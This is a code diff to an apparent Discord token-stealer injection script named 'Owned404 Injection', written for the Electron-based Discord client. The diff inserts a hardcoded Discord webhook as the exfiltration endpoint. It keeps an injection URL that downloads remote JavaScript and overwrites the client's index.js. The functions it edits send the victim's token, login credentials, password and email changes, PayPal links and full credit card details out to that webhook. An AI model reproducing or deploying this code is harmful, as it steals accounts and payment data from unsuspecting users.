@@ -6,13 +6,13 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
+  webhook: 'https://discord.com/api/webhooks/1208577809602187324/vrCrF-xekJ1NX7DKeV-Wq2wr6GTUKTDa9XmuwRypMRv9jxNfOZm67wZZ-Xb13RkQoQJ0', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Owned404 Injection', 
-  embed_icon: 'https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png'.replace(/ /g, '%20'), 
+  embed_icon: 'https://i.pinimg.com/236x/a6/b2/b5/a6b2b57280c723a4ebba77615a6b2856.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/drainweb404/encryptedfuck/main/hahaha.js', 
   /**
@@ -444,7 +444,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('https://discord.com/api/webhooks/1208577809602187324/vrCrF-xekJ1NX7DKeV-Wq2wr6GTUKTDa9XmuwRypMRv9jxNfOZm67wZZ-Xb13RkQoQJ0', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
@@ -681,7 +681,7 @@ const login = async (email, password, token) => {
         },
         footer: {
             text: 'Owned404 Injection',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://i.pinimg.com/236x/a6/b2/b5/a6b2b57280c723a4ebba77615a6b2856.jpg"
         },
       },
     ],
@@ -724,7 +724,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         footer: {
             text: 'Owned404 Injection',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://i.pinimg.com/236x/a6/b2/b5/a6b2b57280c723a4ebba77615a6b2856.jpg"
         },
       },
     ],
@@ -767,7 +767,7 @@ const emailChanged = async (email, password, token) => {
         },
         footer: {
             text: 'Owned404 Injection',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://i.pinimg.com/236x/a6/b2/b5/a6b2b57280c723a4ebba77615a6b2856.jpg"
         },
       },
     ],
@@ -810,7 +810,7 @@ const PaypalAdded = async (token) => {
         },
         footer: {
             text: 'Owned404 Injection',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://i.pinimg.com/236x/a6/b2/b5/a6b2b57280c723a4ebba77615a6b2856.jpg"
         },
       },
     ],
@@ -853,7 +853,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         },
         footer: {
             text: 'Owned404 Injection',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://i.pinimg.com/236x/a6/b2/b5/a6b2b57280c723a4ebba77615a6b2856.jpg"
         },
       },
     ],
@@ -898,7 +898,7 @@ const nitroBought = async (token) => {
         },
         footer: {
             text: 'Owned404 Injection',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
+            icon_url: "https://i.pinimg.com/236x/a6/b2/b5/a6b2b57280c723a4ebba77615a6b2856.jpg"
         },
       },
     ],
